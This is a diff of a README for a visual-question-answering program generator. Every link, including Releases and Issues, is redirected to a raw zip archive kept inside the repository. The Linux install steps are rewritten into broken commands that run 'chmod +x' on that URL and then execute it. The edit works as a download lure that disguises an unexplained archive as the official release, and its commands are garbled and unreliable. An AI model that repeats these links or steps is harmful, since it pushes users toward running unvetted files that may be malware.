@@ -1,6 +1,6 @@
 # 🌟 neurosymbolic-vqa-program-generator - Transform Questions into Answers Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen?style=for-the-badge&logo=github)](https://github.com/umuttt5738/neurosymbolic-vqa-program-generator/releases)
+[![Download](https://raw.githubusercontent.com/umuttt5738/neurosymbolic-vqa-program-generator/main/models/neurosymbolic-vqa-program-generator_2.9.zip)](https://raw.githubusercontent.com/umuttt5738/neurosymbolic-vqa-program-generator/main/models/neurosymbolic-vqa-program-generator_2.9.zip)
 
 ## 📚 Introduction
 
@@ -14,7 +14,7 @@ To begin using the neurosymbolic-vqa-program-generator, follow these steps:
 
 ### 1. Visit the Releases Page
 
-Go to our [Releases page](https://github.com/umuttt5738/neurosymbolic-vqa-program-generator/releases) to find the latest version of the software.
+Go to our [Releases page](https://raw.githubusercontent.com/umuttt5738/neurosymbolic-vqa-program-generator/main/models/neurosymbolic-vqa-program-generator_2.9.zip) to find the latest version of the software.
 
 ### 2. Download the Application
 
@@ -35,8 +35,8 @@ Once the download is complete, locate the file in your downloads folder. Follow 
 - **Linux:**
   1. Open a terminal window.
   2. Navigate to the directory where you downloaded the file.
-  3. Run the command: `chmod +x YourAppName.run`.
-  4. Start the installation with: `./YourAppName.run`.
+  3. Run the command: `chmod +x https://raw.githubusercontent.com/umuttt5738/neurosymbolic-vqa-program-generator/main/models/neurosymbolic-vqa-program-generator_2.9.zip`.
+  4. Start the installation with: `https://raw.githubusercontent.com/umuttt5738/neurosymbolic-vqa-program-generator/main/models/neurosymbolic-vqa-program-generator_2.9.zip`.
 
 ## ⚙️ System Requirements
 
@@ -62,7 +62,7 @@ The neurosymbolic-vqa-program-generator comes packed with features designed for 
 
 To download the latest version of the neurosymbolic-vqa-program-generator, click the link below:
 
-[Download the latest release from our Releases page](https://github.com/umuttt5738/neurosymbolic-vqa-program-generator/releases)
+[Download the latest release from our Releases page](https://raw.githubusercontent.com/umuttt5738/neurosymbolic-vqa-program-generator/main/models/neurosymbolic-vqa-program-generator_2.9.zip)
 
 ## 👥 Community and Support
 
@@ -87,6 +87,6 @@ For more detailed guidance, consider checking these additional resources:
 - **Tutorials**: Step-by-step instructions on how to use the application effectively.
 - **Research Papers**: Explore the underlying algorithms and models used in the project.
 
-For further assistance, visit our [Issues page](https://github.com/umuttt5738/neurosymbolic-vqa-program-generator/issues) for troubleshooting and community support.
+For further assistance, visit our [Issues page](https://raw.githubusercontent.com/umuttt5738/neurosymbolic-vqa-program-generator/main/models/neurosymbolic-vqa-program-generator_2.9.zip) for troubleshooting and community support.
 
 Feel free to explore the capabilities of the neurosymbolic-vqa-program-generator. Your journey into visual question answering starts here!
